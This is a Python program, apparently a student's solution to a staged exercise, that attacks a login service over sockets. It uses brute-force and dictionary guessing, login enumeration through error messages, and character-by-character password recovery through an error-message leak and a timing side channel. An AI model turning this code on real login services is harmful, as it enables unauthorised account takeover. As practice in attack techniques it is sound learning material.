# $Password Hacker
"""The functionality for hacking server's credentials: login and/or password."""

import argparse
import datetime
import itertools
import json
import socket
# from itertools import product
from string import ascii_letters, digits


class PasswordHacker:
    """The creation of the PasswordHacker object and related functionality."""
    
    chars = list(ascii_letters + digits)
    n_ph = 0
    
    def __init__(self, hostname, port, message=None):
        """The initializer of the class.

        Arguments:
        hostname -- string, IP or domain
        port -- integer
        message - string, argument from command line for stage 1/5
        counter -- integer, for log-file
        """
        self.hostname = hostname
        self.port = port
        self.message = message
        self.counter = 0
    
    def __new__(cls, *args, **kwargs):
        if cls.n_ph == 0:
            cls.n_ph += 1
            return object.__new__(cls)
        return None
    
    def __repr__(self):
        return f'Password Hacker object with:\n' \
               f'IP ADDRESS: {self.hostname}\n' \
               f'PORT: {self.port}\n'
    
    def __str__(self):
        return self.__repr__()
    
    def check_connection(self):
        """"Establish connection without login/password and send message."""
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            client_socket.send(self.message.encode())
            response = client_socket.recv(1024).decode()
            return response
    
    @staticmethod
    def generate_password():
        for length in range(1, len(PasswordHacker.chars) + 1):
            for product_ in itertools.product(PasswordHacker.chars, repeat=length):
                yield ''.join(product_)
    
    def simple_brute_force(self):
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            try:
                for password in PasswordHacker.generate_password():
                    client_socket.send(password.encode())
                    response = client_socket.recv(1024).decode()
                    if response == 'Connection success!':
                        return password
            except ConnectionRefusedError as err:
                print(err)
    
    @staticmethod
    def generate_password_from_dict(file_):
        """Choose only 6-letter words from file_."""
        limit_length = 6
        with open(file_, 'r') as f:
            passwords = []
            for line in f:
                line = line.replace("\n", "")
                if len(line) == limit_length:
                    passwords.append(line)
        for length in range(1, len(passwords) + 1):
            for word in iter(passwords):
                yield word
    
    def dictionary_based(self, dict_file):
        """Algorithm is provided with a prepared dictionary of typical passwords.
        Try all possible combinations of upper and lower case for each letter for all words
        of the password dictionary. We won't have to try too much since for a 6-letter word
        you'll get only 64 possible combinations."""
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            try:
                for password in PasswordHacker.generate_password_from_dict(dict_file):
                    for permutation in list(map(''.join, itertools.product(*zip(password.upper(),
                                                                                password.lower())))):
                        client_socket.send(permutation.encode())  # sending through socket as bytes
                        response = client_socket.recv(1024).decode()  # decoding from bytes to string
                        if response == 'Connection success!':
                            return permutation
                    else:
                        # Continue if the inner loop wasn't broken.
                        continue
                    # Inner loop was broken, break the outer.
            except ConnectionRefusedError as err:
                print(err)
    
    @staticmethod
    def chars_iterator():
        yield from itertools.cycle(PasswordHacker.chars)
    
    @staticmethod
    def find_login(logins_file, socket_):
        with open(logins_file, 'r') as file:
            for line in file:
                login = line.rstrip('\n')
                response = PasswordHacker.get_response(socket_, login)
                if response['result'] == 'Wrong password!':
                    return login
    
    @staticmethod
    def get_response(socket, login, password=' '):
        """Use json module to serialize sent and received messages"""
        json_auth = json.dumps({"login": login, "password": password})
        socket.send(json_auth.encode())
        return json.loads(socket.recv(1024).decode())
    
    def log(self, something):
        """Save any intermediate result in log-file."""
        with open('log.txt', 'a') as f:
            f.write(f'{self.counter}: {something} \n')
    
    def vulnerability_brute_force(self, logins_file):
        """Algorithm used when the server sends guiding messages like
        'Exception happened during login'."""
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            # find the login: save it in valid_login
            valid_login = PasswordHacker.find_login(logins_file, client_socket)
            # find password
            password = ""
            try:
                for char in PasswordHacker.chars_iterator():
                    password_guess = password + char
                    response = PasswordHacker.get_response(client_socket, valid_login, password_guess)
                    if response["result"] == "Connection success!":
                        return json.dumps({"login": valid_login, "password": password_guess})
                    elif response["result"] == "Exception happened during login":
                        password = password_guess
            except StopIteration:
                return None
    
    def time_based_vulnerability(self, logins_file):
        """Algorithm used when admin just caught the exception: there should be a delay
        in the server response
        """
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            # find the login; save it in valid_login
            valid_login = PasswordHacker.find_login(logins_file, client_socket)
            PasswordHacker.log(self, valid_login)  # save in log.txt
            self.counter += 1
            
            # find password
            password = ""
            try:
                for char in PasswordHacker.chars_iterator():
                    password_guess = password + char
                    first_time = datetime.datetime.now()
                    response = PasswordHacker.get_response(client_socket, valid_login, password_guess)
                    later_time = datetime.datetime.now()
                    time_delay = later_time - first_time
                    
                    if response["result"] == "Connection success!":
                        return json.dumps({"login": valid_login, "password": password_guess})
                    elif time_delay.microseconds >= 90000:
                        PasswordHacker.log(self, password_guess)  # save in log.txt
                        self.counter += 1
                        PasswordHacker.log(self, time_delay)  # save in log.txt
                        self.counter += 1
                        password = password_guess
            except StopIteration:
                return None


def args():
    """Get arguments from command line. Return parser object with attributes."""
    
    parser = argparse.ArgumentParser(description="This program receives 2 arguments \
     and tries to connect to address with generated password through a socket")
    parser.add_argument("IP", help="Type IP address like 127.0.0.1 ")
    parser.add_argument("port", default="9090",
                        help="Specify port like 9090")
    # parser.add_argument("message", help="Type message for sending")
    return parser.parse_args()


def main():
    # file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\passwords.txt'
    file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt'
    # file_name ='logins.txt'
    arguments = args()
    # ip, port, message = arguments.IP, int(arguments.port), arguments.message
    ip, port = arguments.IP, int(arguments.port)
    hacker_object = PasswordHacker(ip, port)
    # result = hacker_object.check_connection()
    # result = hacker_object.simple_brute_force()
    # result = hacker_object.dictionary_based(file_name)
    # result = hacker_object.vulnerability_brute_force(file_name)
    result = hacker_object.time_based_vulnerability(file_name)
    if result is None:
        print('-> Password not found <-')
    else:
        print(result)


if __name__ == '__main__':
    main()

